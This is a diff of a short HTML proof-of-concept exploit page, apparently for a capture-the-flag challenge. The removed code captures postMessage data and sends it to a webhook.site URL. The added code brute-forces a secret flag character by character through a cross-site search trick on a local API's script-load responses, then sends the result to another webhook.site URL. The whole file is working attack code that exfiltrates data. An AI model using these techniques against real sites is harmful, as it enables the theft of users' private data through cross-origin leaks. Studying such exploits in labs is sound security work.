@@ -1,32 +1,33 @@
 <html>
-
 <head>
-
-    <title>PoC</title>
-
-    <script>
-    function listener(event) {
-        console.log("Message received:", event.data);
-        document.write("<img src='https://webhook.site/094c8223-b8d3-44d0-9f4c-4b6e57060d77/"+event.data+"'></img>");
-    }
-
-    if (window.addEventListener) {
-        console.log("Adding event listener");
-        addEventListener("message", listener, false);
-    } else {
-        console.log("Attaching event listener");
-        attachEvent("onmessage", listener);
-    }
-    </script>
-
 </head>
-
 <body>
-
-    <script>
-        console.log("Opening new window");
-        window.open('http://ptl-2139f587-9ee14626.libcurl.so/key/0');
-    </script>
-
+<script>
+flag_charset =
+  "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
+var charIndex = 0
+const bruteforce = () => {
+var script = document.createElement("script");
+script.src = `//127.0.0.1:1337/api/entries/search?q=${flag}${flag_charset.charAt(charIndex)}`;
+document.appendChild(script)
+script.onload = () => {
+flag += flag_charset.charAt(charIndex);
+charIndex = 0;
+script.parentNode.removeChild(script);
+if (flag.slice(-1) != "}") {
+bruteforce();
+}
+else {
+img = new Image();
+img.src='https://webhook.site/738551fa-b7a0-4116-a708-4b4ef3977471/?flag='+ flag;
+}
+}
+script.onerror = () => {
+script.parentNode.removeChild(script);
+charIndex +=1;
+bruteforce();
+}
+}
+bruteforce()
 </body>
 </html>
